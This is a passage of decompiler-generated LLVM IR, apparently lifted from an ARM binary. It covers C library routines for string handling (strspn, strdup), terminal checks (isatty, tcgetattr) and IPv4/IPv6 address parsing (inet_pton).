.loopexit:                                        ; preds = %dec_label_pc_e514, %dec_label_pc_e4fc, %dec_label_pc_e4e4, %dec_label_pc_e4d0, %dec_label_pc_e540, %dec_label_pc_e560, %bb
  %v0_e568 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e568, i32* %r0.global-to-local, align 4
  %v2_e56c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e56c, i32* @r4, align 4
  ret i32 %v0_e568

; uselistorder directives
  uselistorder i32 %v1_e564, { 1, 0 }
  uselistorder i32 %v1_e538, { 1, 0 }
  uselistorder i32 %v0_e530, { 1, 0 }
  uselistorder i32 %v1_e528, { 0, 2, 1 }
  uselistorder i32 %v1_e524, { 1, 0 }
  uselistorder i32 %v0_e4c0, { 2, 1, 0, 3 }
  uselistorder i32 %v5_e4b4, { 1, 0 }
  uselistorder i32 %v0_e4b4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_e5a82 = load i32, i32* @r0, align 4
  %v1_e5a83 = inttoptr i32 %v0_e5a82 to i8*
  %v2_e5a84 = load i8, i8* %v1_e5a83, align 1
  %v2_e5ac6 = icmp eq i8 %v2_e5a84, 0
  br i1 %v2_e5ac6, label %dec_label_pc_e5b8, label %dec_label_pc_e584.preheader

dec_label_pc_e57c:                                ; preds = %dec_label_pc_e584
  %v1_e58c = add i32 %v0_e58c, 1
  %v9_e57c = icmp eq i8 %v0_e598.in, %v2_e584
  br i1 %v9_e57c, label %dec_label_pc_e598, label %dec_label_pc_e584

dec_label_pc_e584:                                ; preds = %dec_label_pc_e584.preheader, %dec_label_pc_e57c
  %v0_e58c = phi i32 [ %tmp, %dec_label_pc_e584.preheader ], [ %v1_e58c, %dec_label_pc_e57c ]
  %v1_e584 = inttoptr i32 %v0_e58c to i8*
  %v2_e584 = load i8, i8* %v1_e584, align 1
  %v3_e584 = zext i8 %v2_e584 to i32
  store i32 %v3_e584, i32* @ip, align 4
  %v2_e588 = icmp eq i8 %v2_e584, 0
  br i1 %v2_e588, label %dec_label_pc_e5b8, label %dec_label_pc_e57c

dec_label_pc_e598:                                ; preds = %dec_label_pc_e57c
  %v2_e598 = icmp eq i8 %v0_e598.in, 0
  br i1 %v2_e598, label %dec_label_pc_e5b8, label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %dec_label_pc_e598
  %v1_e5a0 = add i32 %v0_e5a0, 1
  store i32 %v1_e5a0, i32* @lr, align 4
  %v1_e5a4 = add i32 %v0_e5a4, 1
  %v1_e5a8 = inttoptr i32 %v1_e5a4 to i8*
  %v2_e5a8 = load i8, i8* %v1_e5a8, align 1
  %v2_e5ac = icmp eq i8 %v2_e5a8, 0
  br i1 %v2_e5ac, label %dec_label_pc_e5b8, label %dec_label_pc_e584.preheader

dec_label_pc_e584.preheader:                      ; preds = %entry, %dec_label_pc_e5a0
  %v0_e5a4 = phi i32 [ %v1_e5a4, %dec_label_pc_e5a0 ], [ %v0_e5a82, %entry ]
  %v0_e5a0 = phi i32 [ %v1_e5a0, %dec_label_pc_e5a0 ], [ 0, %entry ]
  %v0_e598.in = phi i8 [ %v2_e5a8, %dec_label_pc_e5a0 ], [ %v2_e5a84, %entry ]
  br label %dec_label_pc_e584

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e598, %dec_label_pc_e5a0, %dec_label_pc_e584, %entry
  %v0_e5b8 = phi i32 [ 0, %entry ], [ %v0_e5a0, %dec_label_pc_e584 ], [ %v1_e5a0, %dec_label_pc_e5a0 ], [ %v0_e5a0, %dec_label_pc_e598 ]
  ret i32 %v0_e5b8

; uselistorder directives
  uselistorder i8 %v0_e598.in, { 1, 0 }
  uselistorder i8 %v2_e584, { 1, 2, 0 }
  uselistorder i32 %v0_e58c, { 1, 0 }
  uselistorder label %dec_label_pc_e5b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e584.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_e5c0 = load i32, i32* @r4, align 4
  store i32 %v3_e5c0, i32* %stack_var_-12, align 4
  %v6_e5c0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_e5c8 = call i32 @strlen(i8* %arg1)
  %v1_e5cc = add i32 %v3_e5c8, 1
  store i32 %v1_e5cc, i32* @r4, align 4
  %v1_e5d4 = call i32 @malloc(i32 %v1_e5cc)
  store i32 58856, i32* @lr, align 4
  %v1_e5e4 = icmp ne i32 %v1_e5d4, 0
  call void @__pseudo_cond_branch(i1 %v1_e5e4, i32 ptrtoint (i32* @global_var_ab10.195 to i32))
  %v2_e5ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e5ec, i32* @r4, align 4
  store i32 %v6_e5c0, i32* @r5, align 4
  ret i32 %v1_e5d4

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 5, 4, 3, 2, 1, 7, 6, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_e5f4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_e5f4, i32* @r1, align 4
  %v0_e5fc = call i32 @__GI_tcgetattr()
  %v1_e600 = sub i32 1, %v0_e5fc
  %v2_e600 = icmp ult i32 %v0_e5fc, 2
  br i1 %v2_e600, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_e60c = phi i32 [ %v1_e600, %entry ], [ 0, %bb ]
  ret i32 %v5_e60c

; uselistorder directives
  uselistorder i32 %v0_e5fc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_e610 = load i32, i32* @r4, align 4
  %v6_e610 = load i32, i32* @r5, align 4
  %v0_e618 = load i32, i32* @r1, align 4
  store i32 %v0_e618, i32* %r6.global-to-local, align 4
  %v0_e624 = call i32 @ioctl()
  store i32 %v0_e624, i32* %r7.global-to-local, align 4
  %v2_e628 = icmp eq i32 %v0_e624, 0
  %v2_e630 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_e630, i32* @r1, align 4
  br i1 %v2_e628, label %dec_label_pc_e640, label %dec_label_pc_e66c

dec_label_pc_e640:                                ; preds = %entry
  %v1_e638 = add i32 %v0_e618, 17
  %v4_e648 = zext i8 %tmp to i32
  store i32 %v4_e648, i32* @r5, align 4
  %v2_e64c = load i32, i32* %stack_var_-56, align 4
  %v1_e650 = inttoptr i32 %v0_e618 to i32*
  store i32 %v2_e64c, i32* %v1_e650, align 4
  %v3_e650 = add i32 %v0_e618, 4
  %v4_e650 = inttoptr i32 %v3_e650 to i32*
  %v5_e650 = load i32, i32* @ip, align 4
  store i32 %v5_e650, i32* %v4_e650, align 4
  %v6_e650 = add i32 %v0_e618, 8
  %v7_e650 = inttoptr i32 %v6_e650 to i32*
  %v8_e650 = load i32, i32* @lr, align 4
  store i32 %v8_e650, i32* %v7_e650, align 4
  %v0_e654 = load i32, i32* @r4, align 4
  %v1_e654 = load i32, i32* %r6.global-to-local, align 4
  %v2_e654 = add i32 %v1_e654, 12
  %v3_e654 = inttoptr i32 %v2_e654 to i32*
  store i32 %v0_e654, i32* %v3_e654, align 4
  %v0_e658 = load i32, i32* @r5, align 4
  %v1_e658 = trunc i32 %v0_e658 to i8
  %v2_e658 = load i32, i32* %r6.global-to-local, align 4
  %v3_e658 = add i32 %v2_e658, 16
  %v4_e658 = inttoptr i32 %v3_e658 to i8*
  store i8 %v1_e658, i8* %v4_e658, align 1
  %v4_e65c = call i32 @__GI_mempcpy(i32 %v1_e638, i32 %v2_e630, i32 19, i32 %v2_e64c)
  %v0_e660 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_e668 = inttoptr i32 %v4_e65c to i8*
  %v3_e668 = call i32 @__GI_memset(i8* %v2_e668, i32 %v0_e660)
  br label %dec_label_pc_e66c

dec_label_pc_e66c:                                ; preds = %entry, %dec_label_pc_e640
  %v0_e66c = phi i32 [ %v0_e624, %entry ], [ %v0_e660, %dec_label_pc_e640 ]
  store i32 %v3_e610, i32* @r4, align 4
  store i32 %v6_e610, i32* @r5, align 4
  ret i32 %v0_e66c

; uselistorder directives
  uselistorder i32 %v0_e618, { 1, 2, 3, 0, 4 }
  uselistorder i32 13, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e66c, { 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_e67c = load i32, i32* @r5, align 4
  %v2_e684 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_e684, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_e70c3 = load i8, i8* %arg1, align 1
  %v3_e70c4 = zext i8 %v2_e70c3 to i32
  %v5_e70c5 = add i32 %tmp, 1
  store i32 %v5_e70c5, i32* @r4, align 4
  %v2_e7106 = icmp eq i8 %v2_e70c3, 0
  store i1 %v2_e7106, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7106, label %dec_label_pc_e71c, label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %entry, %dec_label_pc_e70c.backedge
  %v0_e6e8 = phi i32 [ %v3_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e70c4, %entry ]
  %v1_e71410.in = phi i32 [ %v3_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e70c4, %entry ]
  %v1_e71410 = add nsw i32 %v1_e71410.in, -48
  %v2_e6a4 = icmp ugt i32 %v1_e71410, 8
  %v7_e6a4 = icmp eq i32 %v1_e71410, 9
  store i1 %v7_e6a4, i1* %cpsr_z.global-to-local, align 1
  %v2_e6ac = xor i1 %v7_e6a4, true
  %v3_e6ac = and i1 %v2_e6a4, %v2_e6ac
  br i1 %v3_e6ac, label %dec_label_pc_e6e8, label %dec_label_pc_e6b0

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e6a4
  %v0_e6b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_e6b0 = inttoptr i32 %v0_e6b0 to i8*
  %v2_e6b0 = load i8, i8* %v1_e6b0, align 1
  %v3_e6b0 = zext i8 %v2_e6b0 to i32
  %v3_e6b8 = mul nuw nsw i32 %v3_e6b0, 10
  %v4_e6b8 = add nuw nsw i32 %v3_e6b8, %v0_e6e8
  %v1_e6bc = add nsw i32 %v4_e6b8, -48
  %v2_e6c0 = icmp ugt i32 %v1_e6bc, 254
  %v7_e6c0 = icmp eq i32 %v1_e6bc, 255
  store i1 %v7_e6c0, i1* %cpsr_z.global-to-local, align 1
  %v2_e6c4 = xor i1 %v7_e6c0, true
  %v3_e6c4 = and i1 %v2_e6c0, %v2_e6c4
  br i1 %v3_e6c4, label %dec_label_pc_e740, label %dec_label_pc_e6c8

dec_label_pc_e6c8:                                ; preds = %dec_label_pc_e6b0
  %v0_e6c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e6c8 = icmp eq i32 %v0_e6c8, 0
  store i1 %v2_e6c8, i1* %cpsr_z.global-to-local, align 1
  %v1_e6cc = trunc i32 %v1_e6bc to i8
  store i8 %v1_e6cc, i8* %v1_e6b0, align 1
  %v0_e6d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e6d0, label %dec_label_pc_e6d4, label %dec_label_pc_e70c.backedge

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6c8
  %v0_e6d4 = load i32, i32* @lr, align 4
  %v1_e6d4 = add i32 %v0_e6d4, 1
  store i32 %v1_e6d4, i32* @lr, align 4
  %v7_e6d8 = icmp eq i32 %v1_e6d4, 4
  store i1 %v7_e6d8, i1* %cpsr_z.global-to-local, align 1
  %v0_e6dc = load i32, i32* %r1.global-to-local, align 4
  %v1_e6dc = add i32 %v0_e6dc, 1
  store i32 %v1_e6dc, i32* %r1.global-to-local, align 4
  %v8_e6e0 = icmp sgt i32 %v1_e6d4, 4
  br i1 %v8_e6e0, label %dec_label_pc_e740, label %dec_label_pc_e70c.backedge

dec_label_pc_e6e8:                                ; preds = %dec_label_pc_e6a4
  %v7_e6e8 = icmp eq i32 %v0_e6e8, 46
  store i1 %v7_e6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6e8, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e6e8
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e740

bb:                                               ; preds = %dec_label_pc_e6e8
  %v1_e6f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e6f0 = urem i32 %v1_e6f0, 2
  %v2_e6f4 = icmp eq i32 %v2_e6f0, 0
  store i1 %v2_e6f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_e6f4, label %dec_label_pc_e740, label %dec_label_pc_e700

dec_label_pc_e700:                                ; preds = %bb
  %v0_e700 = load i32, i32* @lr, align 4
  %v7_e700 = icmp eq i32 %v0_e700, 4
  store i1 %v7_e700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e700, label %dec_label_pc_e740, label %dec_label_pc_e708

dec_label_pc_e708:                                ; preds = %dec_label_pc_e700
  %v2_e708 = load i32, i32* %r0.global-to-local, align 4
  %v3_e708 = add i32 %v2_e708, 1
  %v4_e708 = inttoptr i32 %v3_e708 to i8*
  store i8 0, i8* %v4_e708, align 1
  %v5_e708 = load i32, i32* %r0.global-to-local, align 4
  %v6_e708 = add i32 %v5_e708, 1
  store i32 %v6_e708, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e70c.backedge

dec_label_pc_e70c.backedge:                       ; preds = %dec_label_pc_e708, %dec_label_pc_e6c8, %dec_label_pc_e6d4
  %v0_e70c = load i32, i32* @r4, align 4
  %v1_e70c = inttoptr i32 %v0_e70c to i8*
  %v2_e70c = load i8, i8* %v1_e70c, align 1
  %v3_e70c = zext i8 %v2_e70c to i32
  %v5_e70c = add i32 %v0_e70c, 1
  store i32 %v5_e70c, i32* @r4, align 4
  %v2_e710 = icmp eq i8 %v2_e70c, 0
  store i1 %v2_e710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e710, label %dec_label_pc_e70c.dec_label_pc_e71c_crit_edge, label %dec_label_pc_e6a4

dec_label_pc_e70c.dec_label_pc_e71c_crit_edge:    ; preds = %dec_label_pc_e70c.backedge
  %v0_e71c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e70c.dec_label_pc_e71c_crit_edge, %entry
  %v0_e71c = phi i32 [ %v0_e71c.pre, %dec_label_pc_e70c.dec_label_pc_e71c_crit_edge ], [ 0, %entry ]
  %v7_e71c = icmp eq i32 %v0_e71c, 3
  store i1 %v7_e71c, i1* %cpsr_z.global-to-local, align 1
  %v7_e720 = icmp slt i32 %v0_e71c, 4
  br i1 %v7_e720, label %dec_label_pc_e740, label %dec_label_pc_e724

dec_label_pc_e724:                                ; preds = %dec_label_pc_e71c
  %v0_e724 = load i32, i32* @r5, align 4
  store i32 %v0_e724, i32* @r0, align 4
  store i32 %v2_e684, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_e730 = call i32 @memcpy()
  br label %dec_label_pc_e740

dec_label_pc_e740:                                ; preds = %dec_label_pc_e6b0, %dec_label_pc_e6d4, %bb, %dec_label_pc_e700, %.thread12, %dec_label_pc_e71c, %dec_label_pc_e724
  %storemerge = phi i32 [ 1, %dec_label_pc_e724 ], [ 0, %dec_label_pc_e71c ], [ 0, %.thread12 ], [ 0, %dec_label_pc_e700 ], [ 0, %bb ], [ 0, %dec_label_pc_e6d4 ], [ 0, %dec_label_pc_e6b0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_e67c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_e71c, { 1, 0 }
  uselistorder i32 %v3_e70c, { 1, 0 }
  uselistorder i32 %v0_e6e8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_e740, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_e70c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e6a4, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_e748 = load i32, i32* @r4, align 4
  %v6_e748 = load i32, i32* @r5, align 4
  %v9_e748 = load i32, i32* @r6, align 4
  %v7_e74c = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_e74c, label %dec_label_pc_e76c, label %dec_label_pc_e760

dec_label_pc_e760:                                ; preds = %entry
  %v7_e760 = icmp eq i32 %arg1, 10
  br i1 %v7_e760, label %dec_label_pc_e780, label %dec_label_pc_e930

dec_label_pc_e76c:                                ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_e774 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_e774, i32* %r0.global-to-local, align 4
  store i32 %v4_e774, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e948

dec_label_pc_e780:                                ; preds = %dec_label_pc_e760
  %v2_e780 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e780, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_e78c = bitcast i32* %stack_var_-52 to i8*
  %v3_e78c = call i32 @__GI_memset(i8* %v2_e78c, i32 0)
  store i32 %v3_e78c, i32* %r0.global-to-local, align 4
  %v0_e790 = load i32, i32* @r6, align 4
  %v1_e790 = inttoptr i32 %v0_e790 to i8*
  %v2_e790 = load i8, i8* %v1_e790, align 1
  %v3_e790 = zext i8 %v2_e790 to i32
  store i32 %v3_e790, i32* %r3.global-to-local, align 4
  %v7_e794 = icmp eq i8 %v2_e790, 58
  store i32 %v3_e78c, i32* @r4, align 4
  %v2_e79c = add i32 %v3_e78c, 16
  store i32 %v2_e79c, i32* %r8.global-to-local, align 4
  br i1 %v7_e794, label %dec_label_pc_e7a4, label %dec_label_pc_e7b0

dec_label_pc_e7a4:                                ; preds = %dec_label_pc_e780
  %v1_e7a4 = add i32 %v0_e790, 1
  %v2_e7a4 = inttoptr i32 %v1_e7a4 to i8*
  %v3_e7a4 = load i8, i8* %v2_e7a4, align 1
  %v4_e7a4 = zext i8 %v3_e7a4 to i32
  store i32 %v4_e7a4, i32* %r3.global-to-local, align 4
  store i32 %v1_e7a4, i32* @r6, align 4
  %v7_e7a8 = icmp eq i8 %v3_e7a4, 58
  br i1 %v7_e7a8, label %dec_label_pc_e7b0, label %dec_label_pc_e944

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_e7a4, %dec_label_pc_e780
  %v0_e7b4 = phi i32 [ %v1_e7a4, %dec_label_pc_e7a4 ], [ %v0_e790, %dec_label_pc_e780 ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_e7b4, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_e8907 = inttoptr i32 %v0_e7b4 to i8*
  %v2_e8908 = load i8, i8* %v1_e8907, align 1
  %v3_e8909 = zext i8 %v2_e8908 to i32
  store i32 %v3_e8909, i32* %r0.global-to-local, align 4
  %v1_e89410 = call i32 @__GI_tolower(i32 %v3_e8909)
  store i32 %v1_e89410, i32* %r0.global-to-local, align 4
  store i32 %v1_e89410, i32* @r5, align 4
  %v2_e89812 = icmp eq i32 %v1_e89410, 0
  br i1 %v2_e89812, label %dec_label_pc_e8a0, label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7b0, %dec_label_pc_e890.backedge
  %v0_e7c8 = phi i32 [ %v1_e894, %dec_label_pc_e890.backedge ], [ %v1_e89410, %dec_label_pc_e7b0 ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_e890.backedge ], [ 0, %dec_label_pc_e7b0 ]
  store i32 ptrtoint ([17 x i8]* @global_var_12538.336 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_12538.336 to i32), i32* %r0.global-to-local, align 4
  %v3_e7d0 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_12538.336 to i32), i32 %v0_e7c8)
  %v4_e7d0 = trunc i32 %v3_e7d0 to i8
  store i32 %v3_e7d0, i32* %r0.global-to-local, align 4
  %v3_e7d4 = icmp eq i8 %v4_e7d0, 0
  %v0_e7d8 = load i32, i32* @r6, align 4
  %v1_e7d8 = add i32 %v0_e7d8, 1
  store i32 %v1_e7d8, i32* @r6, align 4
  br i1 %v3_e7d4, label %dec_label_pc_e7f4, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7c4
  %v0_e7e0 = load i32, i32* %sb.global-to-local, align 4
  %v2_e7e0 = sext i8 %v4_e7d0 to i32
  %v3_e7e0 = sub i32 %v2_e7e0, %v0_e7e0
  store i32 %v3_e7e0, i32* %r3.global-to-local, align 4
  %v1_e7e4 = load i32, i32* %r7.global-to-local, align 4
  %v4_e7e4 = mul i32 %v1_e7e4, 16
  %v5_e7e4 = or i32 %v4_e7e4, %v3_e7e0
  store i32 %v5_e7e4, i32* %r7.global-to-local, align 4
  %v3_e7ec = icmp ult i32 %v5_e7e4, 65534
  br i1 %v3_e7ec, label %dec_label_pc_e888, label %dec_label_pc_e944

dec_label_pc_e7f4:                                ; preds = %dec_label_pc_e7c4
  %v0_e7f4 = load i32, i32* @r5, align 4
  %v7_e7f4 = icmp eq i32 %v0_e7f4, 58
  br i1 %v7_e7f4, label %dec_label_pc_e7fc, label %dec_label_pc_e858

dec_label_pc_e7fc:                                ; preds = %dec_label_pc_e7f4
  %v4_e7fc2 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_e7fc2, i32* %r3.global-to-local, align 4
  %v2_e800 = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_e800, label %dec_label_pc_e808, label %dec_label_pc_e81c

dec_label_pc_e808:                                ; preds = %dec_label_pc_e7fc
  %v0_e808 = load i32, i32* %fp.global-to-local, align 4
  %v2_e808 = icmp eq i32 %v0_e808, 0
  br i1 %v2_e808, label %dec_label_pc_e810, label %dec_label_pc_e944

dec_label_pc_e810:                                ; preds = %dec_label_pc_e808
  %v0_e810 = load i32, i32* @r4, align 4
  store i32 %v0_e810, i32* %fp.global-to-local, align 4
  store i32 %v1_e7d8, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e890.backedge

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e7fc
  %v1_e81c = inttoptr i32 %v1_e7d8 to i8*
  %v2_e81c = load i8, i8* %v1_e81c, align 1
  %v3_e81c = zext i8 %v2_e81c to i32
  store i32 %v3_e81c, i32* %r3.global-to-local, align 4
  %v2_e820 = icmp eq i8 %v2_e81c, 0
  br i1 %v2_e820, label %dec_label_pc_e944, label %dec_label_pc_e828

dec_label_pc_e828:                                ; preds = %dec_label_pc_e81c
  %v0_e828 = load i32, i32* @r4, align 4
  %v1_e828 = add i32 %v0_e828, 2
  store i32 %v1_e828, i32* %r3.global-to-local, align 4
  %v1_e82c = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_e828, %v1_e82c
  br i1 %tmp38, label %dec_label_pc_e944, label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e828
  %v0_e834 = load i32, i32* %r7.global-to-local, align 4
  %v3_e834 = udiv i32 %v0_e834, 256
  store i32 %v3_e834, i32* %r2.global-to-local, align 4
  store i32 %v0_e828, i32* %r3.global-to-local, align 4
  %v1_e83c = trunc i32 %v3_e834 to i8
  %v3_e83c = inttoptr i32 %v0_e828 to i8*
  store i8 %v1_e83c, i8* %v3_e83c, align 1
  %v4_e83c = load i32, i32* %r3.global-to-local, align 4
  %v5_e83c = add i32 %v4_e83c, 1
  store i32 %v5_e83c, i32* %r3.global-to-local, align 4
  %v0_e840 = load i32, i32* @r6, align 4
  store i32 %v0_e840, i32* %sl.global-to-local, align 4
  %v0_e844 = load i32, i32* %r7.global-to-local, align 4
  %v1_e844 = trunc i32 %v0_e844 to i8
  %v2_e844 = load i32, i32* @r4, align 4
  %v3_e844 = add i32 %v2_e844, 1
  %v4_e844 = inttoptr i32 %v3_e844 to i8*
  store i8 %v1_e844, i8* %v4_e844, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_e84c = load i32, i32* %r3.global-to-local, align 4
  %v1_e84c = add i32 %v0_e84c, 1
  store i32 %v1_e84c, i32* @r4, align 4
  %v0_e890.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e890.backedge

dec_label_pc_e858:                                ; preds = %dec_label_pc_e7f4
  %v7_e858 = icmp eq i32 %v0_e7f4, 46
  br i1 %v7_e858, label %dec_label_pc_e860, label %dec_label_pc_e944

dec_label_pc_e860:                                ; preds = %dec_label_pc_e858
  %v0_e860 = load i32, i32* @r4, align 4
  %v1_e860 = add i32 %v0_e860, 4
  store i32 %v1_e860, i32* @r5, align 4
  %v1_e864 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_e860, %v1_e864
  br i1 %tmp39, label %dec_label_pc_e944, label %dec_label_pc_e86c

dec_label_pc_e86c:                                ; preds = %dec_label_pc_e860
  %v0_e870 = load i32, i32* %sl.global-to-local, align 4
  %v1_e870 = inttoptr i32 %v0_e870 to i8*
  store i32 %v0_e870, i32* %r0.global-to-local, align 4
  %v4_e874 = call i32 @inet_pton4(i8* %v1_e870, i32 %v0_e860)
  store i32 %v4_e874, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_e874, 1
  br i1 %tmp36, label %dec_label_pc_e944, label %bb

bb:                                               ; preds = %dec_label_pc_e86c
  %v5_e87c = load i32, i32* @r5, align 4
  store i32 %v5_e87c, i32* @r4, align 4
  br label %dec_label_pc_e8cc

dec_label_pc_e888:                                ; preds = %dec_label_pc_e7e0
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e890.backedge

dec_label_pc_e890.backedge:                       ; preds = %dec_label_pc_e888, %dec_label_pc_e810, %dec_label_pc_e834
  %v0_e890 = phi i32 [ %v1_e7d8, %dec_label_pc_e810 ], [ %v0_e890.pre, %dec_label_pc_e834 ], [ %v1_e7d8, %dec_label_pc_e888 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_e810 ], [ 0, %dec_label_pc_e834 ], [ 1, %dec_label_pc_e888 ]
  %v1_e890 = inttoptr i32 %v0_e890 to i8*
  %v2_e890 = load i8, i8* %v1_e890, align 1
  %v3_e890 = zext i8 %v2_e890 to i32
  store i32 %v3_e890, i32* %r0.global-to-local, align 4
  %v1_e894 = call i32 @__GI_tolower(i32 %v3_e890)
  store i32 %v1_e894, i32* %r0.global-to-local, align 4
  store i32 %v1_e894, i32* @r5, align 4
  %v2_e898 = icmp eq i32 %v1_e894, 0
  br i1 %v2_e898, label %dec_label_pc_e8a0, label %dec_label_pc_e7c4

dec_label_pc_e8a0:                                ; preds = %dec_label_pc_e890.backedge, %dec_label_pc_e7b0
